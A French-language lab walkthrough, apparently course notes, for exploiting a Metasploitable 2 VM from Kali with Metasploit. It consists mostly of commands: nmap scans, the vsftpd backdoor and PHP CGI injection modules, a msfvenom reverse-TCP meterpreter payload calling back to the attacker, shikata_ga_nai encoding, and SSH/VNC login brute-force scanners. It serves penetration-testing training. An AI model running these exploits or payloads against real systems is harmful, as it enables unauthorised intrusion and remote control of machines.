# Exploiter des vulnérabilités avec Metasploit

## Introduction
Ce document présente une série de manipulations permettant de découvrir et d’exploiter des vulnérabilités à l’aide du framework Metasploit.

## Mise en place de l’infrastructure

- Importer les VMs :
  - Kali Linux
  - Metasploitable 2

- Configuration du clavier :
```bash
setxkbmap fr
loadkeys fr
```

- Lancement de Metasploit :
```bash
msfconsole
```

## Scan et reconnaissance

- Scan complet :
```bash
nmap -sV -sC -O -p- @IPcible
```

## Utilisation de Metasploit

- Recherche d’un module :
```bash
search mysql
```

- Affichage des infos :
```bash
info exploit/linux/http/librenms_collectd_cmd_inject
```

- Sélection d’un module :
```bash
use exploit/linux/http/librenms_collectd_cmd_inject
```

- Configuration :
```bash
options
set RHOSTS 192.168.X.X
```

- Exécution :
```bash
exploit
```

# Exploit 1 — Backdoor VSFTPD

- Recherche :
```bash
search vsftpd
```

- Infos :
```bash
info exploit/unix/ftp/vsftpd_234_backdoor
```

- Exploit :
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS @IPcible
run
```

- Terminal interactif :
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

# Exploit 2 — Samba
```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS @IPcible
run
searchsploit samba | grep <version>
use exploit/linux/samba/<module>
run
```

# Exploit 3 — PHP (meterpreter)

```bash
dirb http://@IPcible
search type:exploit cve:2012 rank:excellent php
use exploit/multi/http/php_cgi_arg_injection
run
```

# Exploit 4 — msfvenom

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=@IPkali LPORT=4444 -f elf > runmeplz
use exploit/multi/handler
exploit -j -z
scp runmeplz etudiant@IPcible:/home/etudiant/
```

# Encodage

```bash
msfvenom --list encoders
msfvenom -p linux/x86/meterpreter/reverse_tcp -e x86/shikata_ga_nai ...
```

# Exploit 5 — SSH

```bash
enum4linux -U @IPcible
use auxiliary/scanner/ssh/ssh_login
run
```

# Exploit 6 — VNC

```bash
use auxiliary/scanner/vnc/vnc_login
run
vncviewer @IPcible
```
